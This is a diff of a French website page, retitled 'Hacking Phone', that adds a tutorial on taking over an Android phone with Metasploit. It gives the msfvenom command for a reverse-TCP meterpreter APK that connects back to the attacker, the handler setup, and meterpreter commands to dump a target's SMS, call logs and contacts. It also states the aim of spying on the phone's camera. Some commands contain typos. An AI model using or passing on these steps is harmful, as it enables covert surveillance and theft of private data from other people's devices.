@@ -3,7 +3,7 @@
 <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="fr" lang="fr">
 <head>
 	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
-	<title>Comparatif</title>
+	<title>Hacking phone</title>
 	
 	<link rel="stylesheet" href="style.css" type="text/css" media="screen" />
 </head>
@@ -11,7 +11,7 @@
 <div id="container">
 	<div id="header">
 		<h1>
-			Site name
+			HACKING PHONE
 		</h1>
 	</div>
 	<div id="navigation">
@@ -19,7 +19,7 @@
 			<li><a href="index.html">Home</a></li>
 			<li><a href="historique.html">Historique</a></li>
 			<li><a href="topapp.html">Top APP</a></li>
-			<li><a href="hack.html">Hack</a></li>
+			<li><a href="hack.html">Hacking Phone</a></li>
 			<li><a href="hadwar.html">Hadwar</a></li>
 			<li><a href="#">Contact</a></li>
 		</ul>
@@ -71,16 +71,37 @@
 
 	<div class="element">
 		<h2>
-			A EDITER !
+			PIRATER UN TELEPHONE ANDROID!
 		</h2>
 		<p>
-			A EDITER !
+			Dans ce nouvel article je vais vous montrer comment pirater un téléphone Android et extraire les logs des appelles ainsi que les messages et aussi d'espionner la camera de ce téléphone en utilisant Metasploit.<br/>
+Vous trouverez une vidéo en bas de l'article<br/>
+Les lignes de commandes utilisées dans la vidéo :<br/><br/>
+
+    Création du payload <br/><br/>
+
+msfvenom -p android/meterpreter/reverse_tcp lhost=votre_adresse_ip lport=4444  >/root/Desktop/nom_du_payload.apk    (n'oubliez pas l'extension.apk)<br/><br/>
+
+     Metasploit
+<br/><br/>
+msfconsole<br/>
+use exploits/multi/handler<br/>
+set lhost votre_adresse_ipset lport 4444<br/>
+set paylaod android/meterpreter/reverse_tcp<br/>
+exploit<br/><br/>
+
+    Les commandes Meterpreter<br/><br/>
+
+check root   cette lignes de commande vous permettra de savoir si l'appareil de la cible est routée<br/>
+dump_sms  cette ligne de commande est pour extraire les sms du téléphone de la cible dans un fichier texte <br/>
+dump_calllog cette ligne de commande est pour extraire le log des appelles entrant est sortant dans un fichier texte<br/>
+dump_contacts cette ligne de commande vous permettra d'extraire les contacts de la cible dans un fichier texte 
 		</p>
 	</div>
 
 
 	<div id="footer">
-		Copyright © Site name, 20XX
+		Copyright © Hacking, 2017
 	</div>
 </div>
 </body>
